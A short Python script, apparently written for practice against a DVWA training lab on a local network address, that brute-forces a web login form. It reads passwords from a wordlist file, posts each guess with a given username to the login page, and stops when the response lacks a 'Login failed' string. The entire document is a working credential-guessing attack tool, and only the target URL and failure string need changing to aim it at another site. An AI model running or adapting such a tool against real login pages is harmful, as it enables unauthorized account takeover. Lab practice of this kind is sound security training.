#!/usr/bin/python
import requests
from termcolor import colored
def bruteforcer(username,url):
	for password in passwords:
		password=password.strip()
		dict_file={"username":username,"password":password,"Login":"submit"}
		response=requests.post(url,data = dict_file)
		if b'Login failed' in response.content:
			print(colored("[-]Username: "+username+" password: "+password+" NOT IN LIST ",'yellow'))
			pass
		else:
			print(colored("[+] Username: "+username+" password: "+password,'green'))
			exit(0)		
global passwords
page_url="http://192.168.0.106/dvwa/login.php"
username=input("[+] Enter username --> ")
password=input("[+] Enter password path --> ")
with open(password,"r") as passwords:
	bruteforcer(username,page_url)
